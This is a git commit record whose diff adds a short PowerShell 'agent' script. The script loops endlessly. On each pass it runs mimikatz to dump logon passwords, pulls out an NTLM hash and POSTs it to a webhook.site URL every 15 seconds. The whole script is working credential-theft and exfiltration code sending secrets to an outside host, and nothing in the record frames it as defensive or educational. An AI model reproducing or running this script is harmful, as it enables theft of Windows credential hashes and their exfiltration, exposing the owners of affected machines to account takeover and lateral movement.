ce3e4fc624dcc6f37812f6b97671cc94550b70c6
Wout Debaenst <wout+gitlab@compoundc.eu>
2023-11-24 21:23:30 +0100

    agent first version

---
+++ agent/agent.ps1
@@ -0,0 +1,13 @@
+ do {
+
+	$NTLM_cmd = ./mimikatz.exe privilege::debug sekurlsa::logonpasswords exit | Select-String NTLM 
+    $NTLM = ($NTLM_cmd -split '\s+')[4]
+    echo $NTLM
+    
+    
+    $postParams = @{username='junction';ntlm=$NTLM}
+    Invoke-WebRequest -Uri https://webhook.site/3e5ec05c-2bcd-47d1-af56-fb46ee0c84f9 -Method POST -Body $postParams
+    
+    Start-Sleep -s 15
+    
+} while (1) 
